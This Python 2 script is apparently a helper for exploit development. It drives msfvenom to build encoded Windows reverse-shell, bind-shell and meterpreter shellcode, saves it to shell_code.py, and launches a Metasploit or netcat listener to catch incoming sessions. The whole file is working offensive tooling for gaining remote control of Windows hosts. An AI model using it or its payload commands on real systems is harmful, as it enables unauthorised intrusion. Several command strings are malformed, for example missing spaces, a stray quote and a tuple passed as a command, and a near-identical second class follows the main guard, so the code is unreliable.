#!/usr/bin/env python2

import sys
import subprocess
import time
import fileinput
import shutil
import os

W = '\033[0m'     
R = '\033[31m'    
G = '\033[0;32m'  
O = '\33[37m'     
B = '\033[34m'    
P = '\033[35m'   
Y = '\033[1;33m' 

try:  
   if sys.argv[0] and '-c' in sys.argv[1] and  len(sys.argv[1])==2 \
   and'off' in sys.argv[2] and\
   len(sys.argv[2])==3 :
      W = ''     
      R = ''    
      G = ''  
      O = ''     
      B = ''    
      P = ''   
      Y = ''
   
   else: 
       print 'Plsase set color to off'
       exit()
except IndexError:
          try:
            if sys.argv[1]:
               print 'Plsase set color to off'
               exit()  
          except IndexError:
               pass

class Msf_Helper:
    
   def __init__(self):  

      self.shell_option()
      self.copy_shell()
      self.listiner()
   def shell_option(self):
       
      with open('.data','r')as data:
           data_list   =   list(data)                        
      self.bad_disp    =   data_list[3].replace('\n','')
      self.bad_char    =   data_list[4].replace('\n','')
      self.host_ip     =   data_list[5].replace('\n','') 
      
      selcet1= "1"
      selcet2= "2"
      selcet3= "3"
      selcet4= "4"
      selcet5= "5"
      selcet6= "6"
      time.sleep(2)
      print O+"\n[+]"+W+B+" selcet Mode "+W+'\n'+Y+'='*25+'\n'
      print R+"[*] "+W+Y+ "1-"+W+B+ " windows/shell/bind_tcp "+W
      print R+"[*] "+W+Y+ "2-"+W+B+ " windows/shell_reverse_tcp "+W
      print R+"[*] "+W+Y+ "3-"+W+B+ " windows/powershell_reverse_tcp "+W        
      print R+"[*] "+W+Y+ "4-"+W+B+ " windows/meterpreter/reverse_tcp"+W
      print R+"[*] "+W+Y+ "5-"+W+B+ " windows/meterpreter_reverse_http"+W
      print R+"[*] "+W+Y+ "6-"+W+B+ " windows/meterpreter_reverse_https "+W
      print '\n'+O+'+'*40+W

      selcet0= str(raw_input(O+"\n[$] "+W+O+"Select Mode Number : "+W))      
      self.select_port = str(raw_input(O+"[$] "+W+O+"LPORT   =  "+W))

      if selcet0 == selcet1 and len(selcet0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/shell_bind_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(self.select_port)+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_disp)+W +R+'"'+W                 
            run1 = 'msfvenom -p windows/shell_bind_tcp LHOST='+'{}'.format(self.host_ip )+'LPORT='+\
            '{}'.format(self.select_port)+' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+'> ./.rawshell ','2>/dev/null'
            print O+'\n[*] '+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run1,shell=True)   
            self.payload = 'windows/shell_bind_tcp' 
      elif selcet0 == selcet2 and len(selcet0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/shell_reverse_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(self.select_port)+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_disp)+W +R+'"'+W                 
            run2 = 'msfvenom -p windows/shell_reverse_tcp LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(self.select_port)+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+' > ./.rawshell ','2>/dev/null'
            print O+'[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run2,shell=True) 
            self.payload = 'windows/shell_reverse_tcp'
      elif selcet0 == selcet3 and len(selcet0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/powershell_reverse_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(self.select_port)+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_disp)+W +R+'"'+W     
            run3 = 'msfvenom -p windows/powershell_reverse_tcp LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(self.select_port)+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+'> ./.rawshell ','2>/dev/null'
            print O+'[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run3,shell=True)
            self.payload = 'windows/powershell_reverse_tcp'
      elif selcet0 == selcet4 and len(selcet0)==1:  
            print O+'[+] '+W+P+'msfvenom -p windows/meterpreter/reverse_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(self.select_port)+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_disp)+W +R+'"'+W                
            run4 = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(self.select_port)+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+'> ./.rawshell ','2>/dev/null'
            print O+'[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run4,shell=True) 
            self.payload = 'windows/meterpreter/reverse_tcp'
      elif selcet0 == selcet5 and len(selcet0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/meterpreter_reverse_http LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(self.select_port)+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_disp)+W +R+'"'+W     
            run5 = 'msfvenom -p windows/meterpreter_reverse_http" LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(self.select_port)+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+' > ./.rawshell ','2>/dev/null' 
            subprocess.check_output (run5,shell=True) 
            self.payload = 'windows/meterpreter_reverse_http'
      elif selcet0 == selcet6 and len(selcet0)==1:  
            print O+'[+] '+W+P+'msfvenom -p windows/meterpreter_reverse_https LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(self.select_port)+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_disp)+W +R+'"'+W                
            run6 = 'msfvenom -p windows/meterpreter_reverse_https LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(self.select_port)+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+' > ./.rawshell,','2>/dev/null'
            print O+'[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run6,shell=True) 
            self.payload = 'windows/meterpreter_reverse_https'
      else:
           pass
   def copy_shell(self):
         
       with open ('./.rawshell','r') as shellcode:
            shell_code = shellcode.read()
       with open ('./.rawshell','w')as shellcode:
            shel_code = shellcode.write('# pls add your shellcode '+'\n'+\
            'shell_code =('+shell_code.replace('unsigned char buf[] =','').replace(';',')'))
       with open('./.rawshell','r')as readcode :
            readall = readcode.read()
       with open('./shell_code.py','w') as allcode:
            shellall = allcode.write(readall)
       os.remove('./.rawshell')

   def listiner(self):
       print O+"\n[+]"+W+B+" selcet Listnse "+W+'\n'+Y+'='*25+'\n'     
       selcet1= "1"
       selcet2= "2"
       print R+"[*] "+W+Y+ "1-"+W+B+ "msfcondol"+W
       print R+"[*] "+W+Y+ "2-"+W+B+ "netcat"+W 
       selcet01= str(raw_input(O+"\n[$] "+W+O+"Select Mode Number : "+W))
       if selcet01 == selcet1 and len(selcet01)==1: 
          with open ('./.resource','w') as resource : 
               file_resource = resource.write('use exploit/multi/handler'+'\n'+'set payload  '+self.payload+\
               '\n'+'set  LHOST '+self.host_ip+'\n'+'set  LPORT '+self.select_port+'\n'+'clear' +'\n'+'run')
          command_proc = 'gnome-terminal  -e '+'" msfconsole -q -r .resource "'                       
          call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)          
       elif selcet01 == selcet2 and len(selcet01)==1:  
             command ='"'+'nc -nvlp'+self.select_port+'"'
             command_proc = 'gnome-terminal  -e '+ command
             call_termminal = subprocess.call(command_proc,shell=True ,stderr=subprocess.PIPE)
       else:
             pass  
if __name__=="__main__":
   Msf_Helper()

class Msf_Char_NO:
    
   def __init__(self):  

      self.shell_option()
      self.copy_shell()
      self.listiner()

   def shell_option(self):
       
      with open('.data','r')as data:
           data_list   =   list(data)                        
      self.bad_disp    =   data_list[0].replace('\n','')
      self.bad_char    =   data_list[0].replace('\n','')
      self.host_ip     =   data_list[1].replace('\n','') 
      
      selcet1= "1"
      selcet2= "2"
      selcet3= "3"
      selcet4= "4"
      selcet5= "5"
      selcet6= "6"
      time.sleep(2)
      print O+"\n[+]"+W+B+" selcet Mode "+W+'\n'+Y+'='*25+'\n'
      print R+"[*] "+W+Y+ "1-"+W+B+ " windows/shell/bind_tcp "+W
      print R+"[*] "+W+Y+ "2-"+W+B+ " windows/shell_reverse_tcp "+W
      print R+"[*] "+W+Y+ "3-"+W+B+ " windows/powershell_reverse_tcp "+W        
      print R+"[*] "+W+Y+ "4-"+W+B+ " windows/meterpreter/reverse_tcp"+W
      print R+"[*] "+W+Y+ "5-"+W+B+ " windows/meterpreter_reverse_http"+W
      print R+"[*] "+W+Y+ "6-"+W+B+ " windows/meterpreter_reverse_https "+W
      print '\n'+O+'+'*40+W

      selcet0= str(raw_input(O+"\n[$] "+W+O+"Select Mode Number : "+W))      
      self.select_port = str(raw_input(O+"[$] "+W+O+"LPORT   =  "+W))

      if selcet0 == selcet1 and len(selcet0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/shell_bind_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(self.select_port)+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_disp)+W +R+'"'+W                 
            run1 = 'msfvenom -p windows/shell_bind_tcp LHOST='+'{}'.format(self.host_ip )+'LPORT='+\
            '{}'.format(self.select_port)+' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+'> ./.rawshell ','2>/dev/null'
            print O+'\n[*] '+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run1,shell=True)   
            self.payload = 'windows/shell_bind_tcp' 
      elif selcet0 == selcet2 and len(selcet0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/shell_reverse_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(self.select_port)+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_disp)+W +R+'"'+W                 
            run2 = 'msfvenom -p windows/shell_reverse_tcp LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(self.select_port)+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+' > ./.rawshell ','2>/dev/null'
            print O+'[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run2,shell=True) 
            self.payload = 'windows/shell_reverse_tcp'
      elif selcet0 == selcet3 and len(selcet0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/powershell_reverse_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(self.select_port)+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_disp)+W +R+'"'+W     
            run3 = 'msfvenom -p windows/powershell_reverse_tcp LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(self.select_port)+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+'> ./.rawshell ','2>/dev/null'
            print O+'[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run3,shell=True)
            self.payload = 'windows/powershell_reverse_tcp'
      elif selcet0 == selcet4 and len(selcet0)==1:  
            print O+'[+] '+W+P+'msfvenom -p windows/meterpreter/reverse_tcp LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(self.select_port)+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_disp)+W +R+'"'+W                
            run4 = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(self.select_port)+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+'> ./.rawshell ','2>/dev/null'
            print O+'[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run4,shell=True) 
            self.payload = 'windows/meterpreter/reverse_tcp'
      elif selcet0 == selcet5 and len(selcet0)==1: 
            print O+'[+] '+W+P+'msfvenom -p windows/meterpreter_reverse_http LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(self.select_port)+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_disp)+W +R+'"'+W     
            run5 = 'msfvenom -p windows/meterpreter_reverse_http" LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(self.select_port)+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+' > ./.rawshell ','2>/dev/null' 
            subprocess.check_output (run5,shell=True) 
            self.payload = 'windows/meterpreter_reverse_http'
      elif selcet0 == selcet6 and len(selcet0)==1:  
            print O+'[+] '+W+P+'msfvenom -p windows/meterpreter_reverse_https LHOST='+W+O+'{}'.format(self.host_ip )+W+P+' LPORT='+W+\
            O+'{}'.format(self.select_port)+W+P+ ' -e x86/shikata_ga_nai -i 2 -f c -b "'+W+O+'{}'.format(self.bad_disp)+W +R+'"'+W                
            run6 = 'msfvenom -p windows/meterpreter_reverse_https LHOST='+'{}'.format(self.host_ip )+' LPORT='+\
            '{}'.format(self.select_port)+ ' -e x86/shikata_ga_nai -i 2 -f c '+'-b'+'"'+'{}'.format(self.bad_char)+'"'+' > ./.rawshell,','2>/dev/null'
            print O+'[*]'+W+R+'Shellcode Info'+W+'\n'+Y+'='*25+'\n'
            subprocess.check_output (run6,shell=True) 
            self.payload = 'windows/meterpreter_reverse_https'
      else:
           pass
   def copy_shell(self):
         
       with open ('./.rawshell','r') as shellcode:
            shell_code = shellcode.read()
       with open ('./.rawshell','w')as shellcode:
            shel_code = shellcode.write('# pls add your shellcode '+'\n'+\
            'shell_code =('+shell_code.replace('unsigned char buf[] =','').replace(';',')'))

       with open('./.rawshell','r')as readcode :
            readall = readcode.read()
       with open('./shell_code.py','w') as allcode:
            shellall = allcode.write(readall)
       os.remove('./.rawshell')

   def listiner(self):
       print O+"\n[+]"+W+B+" selcet Listnse "+W+'\n'+Y+'='*25+'\n'     
       selcet1= "1"
       selcet2= "2"
       print R+"[*] "+W+Y+ "1-"+W+B+ "msfcondol"+W
       print R+"[*] "+W+Y+ "2-"+W+B+ "netcat"+W 
       selcet01= str(raw_input(O+"\n[$] "+W+O+"Select Mode Number : "+W))
       if selcet01 == selcet1 and len(selcet01)==1: 
          with open ('./.resource','w') as resource : 
               file_resource = resource.write('use exploit/multi/handler'+'\n'+'set payload  '+self.payload+\
               '\n'+'set  LHOST '+self.host_ip+'\n'+'set  LPORT '+self.select_port+'\n'+'clear' +'\n'+'run')
          command_proc = 'gnome-terminal  -e '+'" msfconsole -q -r .resource "'                       
          call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)          
       elif selcet01 == selcet2 and len(selcet01)==1:  
             command ='"'+'nc -nvlp'+self.select_port+'"'
             command_proc = 'gnome-terminal  -e '+ command
             call_termminal = subprocess.call(command_proc,shell=True ,stderr=subprocess.PIPE)
       else:
             pass  
if __name__=="__main__":
   Msf_Char_NO()


 

